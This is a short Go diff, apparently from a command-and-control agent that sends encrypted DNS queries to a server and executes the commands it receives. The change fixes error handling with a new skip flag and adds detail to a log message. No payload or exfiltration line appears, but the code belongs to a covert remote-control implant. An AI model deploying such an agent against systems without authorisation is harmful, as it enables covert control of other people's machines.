@@ -178,14 +178,16 @@ func SendQuestionToServer(Q string) error {
 		if err != nil {
 			return fmt.Errorf("failed to send the payload: %s", err)
 		}
-		msgList, err := c2.DecryptIncomingPacket(response, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
-		if err != nil {
+		msgList, skip, err := c2.DecryptIncomingPacket(response, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
+		if err != nil && !skip {
 			return fmt.Errorf("error in decrypting incoming packet from server: %s", err)
+		} else if !skip {
+			return handleServerCommand(msgList)
 		}
-		return handleServerCommand(msgList)
 	} else {
 		return fmt.Errorf("query is too big %d, can't send this", len(Q))
 	}
+	return nil
 }
 
 func sendHealthCheck() error {
@@ -197,7 +199,7 @@ func sendHealthCheck() error {
 	payload := []byte("Ping!")
 	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
 	if err != nil {
-		log.Warnf("Error sending Message to Server")
+		log.Warnf("Error sending Message to Server: %s", err)
 	}
 	for _, Q := range Questions {
 		err = SendQuestionToServer(Q)
